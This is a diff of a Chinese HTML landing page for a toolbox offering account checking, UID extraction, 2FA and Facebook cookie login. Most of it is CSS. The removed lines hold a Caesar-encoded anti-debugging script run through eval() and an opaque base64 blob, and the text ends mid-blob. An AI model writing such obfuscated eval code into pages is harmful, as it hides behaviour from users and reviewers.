@@ -1,70 +1,1288 @@
 <!DOCTYPE html>
-    <html>
-    <head><meta charset="UTF-8"></head>
-    <body>
-    <script>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="实用工具库 · 暗色精品控制台风格，整合账号检测、UID提取、2FA验证、Cookie登录等实用工具。" />
+  <meta name="keywords" content="工具箱,账号检测,UID提取,2FA验证,Cookie登录,脸书,软件下载" />
+  <meta name="author" content="小豆" />
+  <meta name="theme-color" content="#11100E" media="(prefers-color-scheme: dark)" />
+  <meta name="theme-color" content="#F4EFE7" media="(prefers-color-scheme: light)" />
+  <meta property="og:title" content="小豆 · 实用工具库" />
+  <meta property="og:description" content="暗色精品控制台风格的实用工具集合。" />
+  <meta property="og:type" content="website" />
+  <title>小豆 · 实用工具库</title>
 
-    function _decode(str) {
-        return [...str].map(c => String.fromCharCode(c.charCodeAt(0) - 5)).join('');
+  <style>
+    /* ============================================================
+       设计系统：暗色精品控制台
+       默认暗色 — 深炭底 + 暖白文字 + 暖铜色点缀 + 鼠尾草绿辅助
+       浅色  — 暖米白底 + 深炭文字 + 同色系点缀
+       ============================================================ */
+    :root,
+    [data-theme="dark"] {
+      --bg: #11100E;
+      --bg-soft: #16140F;
+      --card: #1A1815;
+      --card-2: rgba(255, 255, 255, 0.04);
+      --card-border: rgba(255, 255, 255, 0.08);
+      --card-border-strong: rgba(196, 154, 99, 0.35);
+      --text: #F4EFE7;
+      --text-soft: #A8A096;
+      --text-muted: #6E6A62;
+      --accent: #C49A63;
+      --accent-soft: rgba(196, 154, 99, 0.12);
+      --accent-glow: rgba(196, 154, 99, 0.18);
+      --highlight: #7E8F78;
+      --highlight-soft: rgba(126, 143, 120, 0.14);
+      --highlight-glow: rgba(126, 143, 120, 0.22);
+      --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.4);
+      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.35), 0 16px 40px rgba(0, 0, 0, 0.45);
+      --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.45), 0 32px 80px rgba(0, 0, 0, 0.55);
+      --glass: rgba(26, 24, 21, 0.72);
+      --glass-border: rgba(255, 255, 255, 0.06);
+      --input-bg: rgba(255, 255, 255, 0.03);
+      --input-border: rgba(255, 255, 255, 0.10);
+      --header-bg: rgba(17, 16, 14, 0.72);
+      --kbd-bg: rgba(255, 255, 255, 0.05);
+      --ripple: rgba(196, 154, 99, 0.30);
+      --match-ring: rgba(126, 143, 120, 0.50);
+      --progress: linear-gradient(90deg, #C49A63 0%, #7E8F78 100%);
+      --grain-opacity: 0.04;
+      --blob-a: rgba(196, 154, 99, 0.10);
+      --blob-b: rgba(126, 143, 120, 0.08);
+    }
+
+    [data-theme="light"] {
+      --bg: #F4EFE7;
+      --bg-soft: #EDE6DA;
+      --card: #FFFFFF;
+      --card-2: rgba(31, 29, 26, 0.03);
+      --card-border: rgba(31, 29, 26, 0.10);
+      --card-border-strong: rgba(168, 124, 60, 0.40);
+      --text: #1A1815;
+      --text-soft: #5C574F;
+      --text-muted: #9A9389;
+      --accent: #A87C3E;
+      --accent-soft: rgba(168, 124, 60, 0.10);
+      --accent-glow: rgba(168, 124, 60, 0.16);
+      --highlight: #5E7058;
+      --highlight-soft: rgba(94, 112, 88, 0.12);
+      --highlight-glow: rgba(94, 112, 88, 0.20);
+      --shadow-sm: 0 1px 2px rgba(31, 29, 26, 0.05);
+      --shadow-md: 0 4px 12px rgba(31, 29, 26, 0.06), 0 16px 40px rgba(31, 29, 26, 0.08);
+      --shadow-lg: 0 8px 24px rgba(31, 29, 26, 0.08), 0 32px 80px rgba(31, 29, 26, 0.12);
+      --glass: rgba(255, 255, 255, 0.72);
+      --glass-border: rgba(255, 255, 255, 0.6);
+      --input-bg: rgba(255, 255, 255, 0.6);
+      --input-border: rgba(31, 29, 26, 0.12);
+      --header-bg: rgba(244, 239, 231, 0.78);
+      --kbd-bg: rgba(31, 29, 26, 0.04);
+      --ripple: rgba(168, 124, 60, 0.28);
+      --match-ring: rgba(94, 112, 88, 0.45);
+      --progress: linear-gradient(90deg, #A87C3E 0%, #5E7058 100%);
+      --grain-opacity: 0.025;
+      --blob-a: rgba(168, 124, 60, 0.10);
+      --blob-b: rgba(94, 112, 88, 0.08);
+    }
+
+    /* ============================================================
+       基础重置
+       ============================================================ */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display",
+        "SF Pro Text", "Segoe UI", "PingFang SC", "Hiragino Sans GB",
+        "Microsoft YaHei", sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      transition: background-color 0.4s ease, color 0.4s ease;
+      font-feature-settings: "ss01", "cv01", "tnum";
+    }
+
+    a { color: inherit; text-decoration: none; }
+    button { font-family: inherit; cursor: pointer; border: none; background: none; color: inherit; }
+    ::selection { background: var(--accent); color: #fff; }
+
+    /* ============================================================
+       背景层：极淡光斑 + 颗粒纹理
+       ============================================================ */
+    .bg-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+    .blob {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(100px);
+      transition: background 0.4s ease;
+    }
+    .blob-a {
+      width: 620px; height: 620px;
+      top: -200px; right: -160px;
+      background: var(--blob-a);
+    }
+    .blob-b {
+      width: 520px; height: 520px;
+      bottom: -180px; left: -140px;
+      background: var(--blob-b);
+    }
+    .grain {
+      position: absolute;
+      inset: 0;
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='180' height='180'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2' stitchTiles='stitch'/><feColorMatrix values='0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 0.5 0'/></filter><rect width='100%' height='100%' filter='url(%23n)' opacity='0.5'/></svg>");
+      opacity: var(--grain-opacity);
+      mix-blend-mode: overlay;
+    }
+
+    /* ============================================================
+       顶部加载进度条
+       ============================================================ */
+    .progress {
+      position: fixed;
+      top: 0; left: 0;
+      height: 2px;
+      width: 0;
+      background: var(--progress);
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .progress.active { opacity: 1; }
+
+    /* ============================================================
+       Header
+       ============================================================ */
+    .header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 56px;
+      background: var(--header-bg);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 1px solid transparent;
+      transition: border-color 0.3s ease, background 0.4s ease;
+    }
+    .header.scrolled { border-bottom-color: var(--card-border); }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 40px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+    }
+    .brand-mark {
+      width: 30px; height: 30px;
+      display: grid;
+      place-items: center;
+      border-radius: 9px;
+      background: linear-gradient(135deg, var(--accent), var(--highlight));
+      color: var(--bg);
+      transition: transform 0.3s ease;
+    }
+    .brand:hover .brand-mark { transform: rotate(-6deg); }
+    .brand-mark svg { width: 16px; height: 16px; }
+
+    .brand-name {
+      font-size: 15px;
+      font-weight: 580;
+      letter-spacing: -0.01em;
+      color: var(--text);
+    }
+    .brand-name span { color: var(--text-muted); font-weight: 400; margin: 0 2px; }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+    .nav-link {
+      font-size: 13px;
+      color: var(--text-soft);
+      letter-spacing: 0.01em;
+      transition: color 0.3s ease;
+      position: relative;
+    }
+    .nav-link:hover { color: var(--text); }
+    .nav-link.active { color: var(--text); }
+    .nav-link.active::after {
+      content: "";
+      position: absolute;
+      bottom: -22px;
+      left: 0; right: 0;
+      height: 2px;
+      background: var(--accent);
+      border-radius: 2px;
+    }
+
+    .header-tools {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .clock {
+      font-size: 12.5px;
+      font-variant-numeric: tabular-nums;
+      color: var(--text-soft);
+      letter-spacing: 0.02em;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .clock-date { color: var(--text-muted); }
+    .clock-sep {
+      width: 3px; height: 3px;
+      border-radius: 50%;
+      background: var(--text-muted);
+      opacity: 0.6;
+    }
+
+    .theme-toggle {
+      width: 36px; height: 36px;
+      display: grid;
+      place-items: center;
+      border-radius: 10px;
+      border: 1px solid var(--card-border);
+      background: var(--card-2);
+      color: var(--text-soft);
+      transition: all 0.3s ease;
+    }
+    .theme-toggle:hover {
+      color: var(--accent);
+      border-color: var(--accent);
+      transform: translateY(-1px);
+    }
+    .theme-toggle svg { width: 17px; height: 17px; }
+    .theme-toggle .icon-moon { display: none; }
+    .theme-toggle .icon-sun { display: block; }
+    [data-theme="dark"] .theme-toggle .icon-moon { display: block; }
+    [data-theme="dark"] .theme-toggle .icon-sun { display: none; }
+
+    /* ============================================================
+       Main
+       ============================================================ */
+    .main {
+      position: relative;
+      z-index: 1;
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 0 56px;
+    }
+
+    /* Hero */
+    .hero {
+      padding: 112px 0 32px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 1s cubic-bezier(0.16, 1, 0.3, 1) 0.15s forwards;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 6px 14px;
+      border-radius: 999px;
+      border: 1px solid var(--card-border);
+      background: var(--card-2);
+      font-size: 11.5px;
+      font-weight: 500;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--text-soft);
+      margin-bottom: 32px;
+    }
+    .hero-eyebrow .dot {
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--highlight);
+      box-shadow: 0 0 0 3px var(--highlight-soft);
+    }
+
+    .hero-title {
+      font-size: clamp(40px, 6.4vw, 72px);
+      font-weight: 600;
+      letter-spacing: -0.035em;
+      line-height: 1.05;
+      color: var(--text);
+      margin-bottom: 24px;
+      max-width: 16ch;
+    }
+    .hero-title em {
+      font-style: italic;
+      font-weight: 400;
+      background: linear-gradient(120deg, var(--accent), var(--highlight));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-sub {
+      font-size: 17px;
+      line-height: 1.65;
+      color: var(--text-soft);
+      max-width: 48ch;
+      margin-bottom: 44px;
+    }
+
+    /* 搜索框 */
+    .search {
+      max-width: 460px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 1s cubic-bezier(0.16, 1, 0.3, 1) 0.35s forwards;
+    }
+    .search-field { position: relative; display: flex; align-items: center; }
+    .search-field svg {
+      position: absolute;
+      left: 17px;
+      width: 17px; height: 17px;
+      color: var(--text-muted);
+      pointer-events: none;
+      transition: color 0.3s ease;
+    }
+    .search-input {
+      width: 100%;
+      height: 52px;
+      padding: 0 18px 0 46px;
+      font-size: 14.5px;
+      color: var(--text);
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 13px;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      outline: none;
+      transition: all 0.3s ease;
+    }
+    .search-input::placeholder { color: var(--text-muted); }
+    .search-input:focus {
+      border-color: var(--accent);
+      background: var(--card-2);
+      box-shadow: 0 0 0 4px var(--accent-soft);
+    }
+    .search-field:focus-within svg { color: var(--accent); }
+
+    .search-hint {
+      margin-top: 14px;
+      font-size: 12px;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .search-hint kbd {
+      display: inline-flex;
+      align-items: center;
+      padding: 2px 7px;
+      font-size: 11px;
+      font-family: inherit;
+      color: var(--text-soft);
+      background: var(--kbd-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 5px;
+      line-height: 1.5;
+    }
+
+    /* ============================================================
+       卡片网格 — 3D 倾斜 + 鼠标跟随光效
+       ============================================================ */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px;
+      margin: 88px 0 120px;
+      perspective: 1200px;
+    }
+
+    .card {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      padding: 32px 30px 28px;
+      background: var(--card);
+      border: 1px solid var(--card-border);
+      border-radius: 22px;
+      box-shadow: var(--shadow-md);
+      overflow: hidden;
+      cursor: pointer;
+      opacity: 0;
+      transform: translateY(24px);
+      transition: transform 0.3s ease, box-shadow 0.3s ease,
+        border-color 0.3s ease, opacity 0.3s ease, filter 0.3s ease;
+      transform-style: preserve-3d;
+      will-change: transform;
+      isolation: isolate;
+    }
+    .card:nth-child(1) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.5s forwards; }
+    .card:nth-child(2) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.58s forwards; }
+    .card:nth-child(3) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.66s forwards; }
+    .card:nth-child(4) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.74s forwards; }
+    .card:nth-child(5) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.82s forwards; }
+    .card:nth-child(6) { animation: fadeUp 0.9s cubic-bezier(0.16, 1, 0.3, 1) 0.90s forwards; }
+
+    /* 鼠标跟随光斑层 */
+    .card-glow {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      opacity: 0;
+      background: radial-gradient(
+        320px circle at var(--mx, 50%) var(--my, 50%),
+        var(--accent-glow),
+        transparent 60%
+      );
+      transition: opacity 0.3s ease;
+      z-index: 0;
+    }
+    .card:hover .card-glow { opacity: 1; }
+
+    /* 顶部高光线 */
+    .card::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 24px; right: 24px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent), transparent);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 2;
+    }
+    .card:hover::before { opacity: 0.7; }
+
+    .card:hover {
+      border-color: var(--card-border-strong);
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* 搜索匹配高亮 */
+    .card.match {
+      border-color: var(--highlight);
+      box-shadow: 0 0 0 1px var(--highlight), 0 0 0 5px var(--match-ring), var(--shadow-lg);
+    }
+    .card.dim { opacity: 0.32; filter: saturate(0.5); }
+
+    /* 点击压缩反馈 */
+    .card.pressed { transform: scale(0.98); }
+
+    .card-inner {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      transition: transform 0.3s ease;
+      transform: translateZ(0);
+    }
+    .card:hover .card-inner { transform: translateZ(20px) translateY(-2px); }
+
+    .card-head {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      margin-bottom: 28px;
+    }
+
+    .card-icon {
+      width: 50px; height: 50px;
+      display: grid;
+      place-items: center;
+      border-radius: 13px;
+      background: var(--accent-soft);
+      color: var(--accent);
+      border: 1px solid var(--card-border);
+      transition: all 0.3s ease;
+      transform: translateZ(0);
+    }
+    .card:hover .card-icon {
+      background: var(--accent);
+      color: var(--bg);
+      border-color: var(--accent);
+      transform: translateZ(30px);
+    }
+    .card-icon svg { width: 23px; height: 23px; }
+
+    .card-num {
+      font-size: 11.5px;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.1em;
+      color: var(--text-muted);
+      font-weight: 500;
+      font-family: "SF Mono", "JetBrains Mono", "Menlo", monospace;
+    }
+
+    .card-title {
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+    .card-subtitle {
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 16px;
+      font-family: "SF Mono", "JetBrains Mono", "Menlo", monospace;
+    }
+    .card-desc {
+      font-size: 13.5px;
+      line-height: 1.65;
+      color: var(--text-soft);
+      margin-bottom: 28px;
+      flex: 1;
+    }
+
+    .card-enter {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      align-self: flex-start;
+      padding: 10px 16px 10px 18px;
+      font-size: 13.5px;
+      font-weight: 500;
+      color: var(--text);
+      background: var(--card-2);
+      border: 1px solid var(--card-border);
+      border-radius: 999px;
+      transition: all 0.3s ease;
+      overflow: hidden;
+    }
+    .card-enter .arrow {
+      display: inline-flex;
+      transition: transform 0.3s ease;
+    }
+    .card-enter .arrow svg { width: 14px; height: 14px; display: block; }
+    .card:hover .card-enter {
+      background: var(--accent);
+      color: var(--bg);
+      border-color: var(--accent);
+    }
+    .card:hover .card-enter .arrow { transform: translateX(4px); }
+
+    /* 加载旋转圈 */
+    .card-loader {
+      width: 14px;
+      height: 14px;
+      border: 2px solid var(--card-border);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.4s linear 2;
+      display: none;
+      flex-shrink: 0;
+    }
+    .card.loading .card-loader { display: inline-block; }
+    .card.loading .card-enter .arrow { display: none; }
+
+    /* 点击波纹 */
+    .ripple {
+      position: absolute;
+      border-radius: 50%;
+      background: var(--ripple);
+      transform: scale(0);
+      animation: rippleAnim 0.65s ease-out;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ============================================================
+       Footer
+       ============================================================ */
+    .footer {
+      position: relative;
+      z-index: 1;
+      border-top: 1px solid var(--card-border);
+      transition: border-color 0.4s ease;
+    }
+    .footer-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 36px 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .footer-copy {
+      font-size: 12.5px;
+      color: var(--text-soft);
+      letter-spacing: 0.01em;
+    }
+    .footer-copy b { color: var(--text); font-weight: 500; }
+    .footer-copy .sep { color: var(--text-muted); margin: 0 8px; }
+
+    .footer-stats {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+    .stat {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+    .stat-value {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      font-variant-numeric: tabular-nums;
+      font-family: "SF Mono", "JetBrains Mono", "Menlo", monospace;
+    }
+    .stat-label {
+      font-size: 10.5px;
+      color: var(--text-muted);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .stat-dot {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+    .stat-dot::before {
+      content: "";
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--highlight);
+      box-shadow: 0 0 0 3px var(--highlight-soft);
+    }
+
+    /* ============================================================
+       返回顶部
+       ============================================================ */
+    .back-top {
+      position: fixed;
+      right: 32px; bottom: 32px;
+      width: 44px; height: 44px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--card);
+      border: 1px solid var(--card-border);
+      box-shadow: var(--shadow-md);
+      color: var(--text-soft);
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(12px) scale(0.9);
+      transition: all 0.3s ease;
+      z-index: 90;
+    }
+    .back-top.show {
+      opacity: 1;
+      visibility: visible;
+      transform: translateY(0) scale(1);
+    }
+    .back-top:hover {
+      color: var(--accent);
+      border-color: var(--accent);
+      transform: translateY(-2px);
+    }
+    .back-top svg { width: 18px; height: 18px; }
+
+    /* ============================================================
+       动画关键帧
+       ============================================================ */
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes rippleAnim {
+      to { transform: scale(4); opacity: 0; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ============================================================
+       响应式：平板两列
+       ============================================================ */
+    @media (max-width: 1023px) {
+      .header { padding: 14px 32px; }
+      .header-left { gap: 28px; }
+      .nav-links { gap: 22px; }
+      .main { padding: 0 32px; }
+      .hero { padding: 88px 0 24px; }
+      .cards { grid-template-columns: repeat(2, 1fr); gap: 18px; margin: 64px 0 88px; }
+      .footer-inner { padding: 32px; }
+    }
+
+    /* ============================================================
+       响应式：手机单列，禁用 hover 倾斜
+       ============================================================ */
+    @media (max-width: 767px) {
+      .header { padding: 13px 20px; }
+      .nav-links { display: none; }
+      .brand-name { font-size: 14px; }
+      .clock-date, .clock-sep { display: none; }
+      .main { padding: 0 20px; }
+      .hero { padding: 64px 0 16px; }
+      .hero-title { font-size: 38px; letter-spacing: -0.03em; }
+      .hero-sub { font-size: 15.5px; }
+      .cards { grid-template-columns: 1fr; gap: 14px; margin: 48px 0 72px; perspective: none; }
+      .card { padding: 28px 24px 24px; transform: none !important; }
+      .card:hover .card-inner { transform: none; }
+      .card:hover .card-icon { transform: none; }
+      .footer-inner {
+        padding: 28px 20px;
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 18px;
       }
-    const _encryptedAntiLog = 'htsxy%dfsynIjgzlXyfwy%B%sj|%Ifyj-.3ljyYnrj-.@ijgzlljw@htsxy%dfsynIjgzlJsi%B%sj|%Ifyj-.3ljyYnrj-.@nk%-dfsynIjgzlJsi%2%dfsynIjgzlXyfwy%C%655.%%|mnqj-ywzj.%%htsxy%dtwnlnsfqQtl%B%htsxtqj3qtl@htsxtqj3qtl%B%kzshynts-333fwlx.%htsxy%duwthjxxjiFwlx%B%fwlx3rfu-fwl%BC%nk%-fwl%BBB%|nsit|3d5}6>%%fwl%BBB%|nsit|3d5}6<.%wjyzws%,`溕砆巷俢抩１禆歧htsxtqj托卵b,@nk%-fwl%BBB%|nsit|3d5}6=%%fwl%BBB%|nsit|3d5}6;.%wjyzws%,`觨寋刂敵巷俢抩b,@wjyzws%fwl@.@dtwnlnsfqQtl3fuuq~-htsxtqj1%duwthjxxjiFwlx.@@qjy%dwjfqIjhw~uyWjxzqy%B%,,@Tgojhy3ijknsjUwtujwy~-|nsit|1%,d5}6>,1%ljy?%kzshynts-.%htsxy%dxyfhp%B%sj|%Jwwtw-.3xyfhp@nk%-dxyfhp%++%dxyfhp3nshqzijx-,htsxtqj3qtl,..%wjyzws%,`禆歧htsxtqj谀叛d5}6>b,@wjyzws%dwjfqIjhw~uyWjxzqy@1xjy?%kzshynts-{fq.%dwjfqIjhw~uyWjxzqy%B%{fq@1htsknlzwfgqj?%kfqxj1jszrjwfgqj?%kfqxj.@';
-    const _antiLogCode = _decode(_encryptedAntiLog);
-    try {
-      eval(_antiLogCode);
-    } catch (e) {
-      console.error("Anti-log initialization failed:", e);
+      .footer-stats { gap: 22px; }
+      .back-top { right: 20px; bottom: 20px; }
     }
-    const _0xa = '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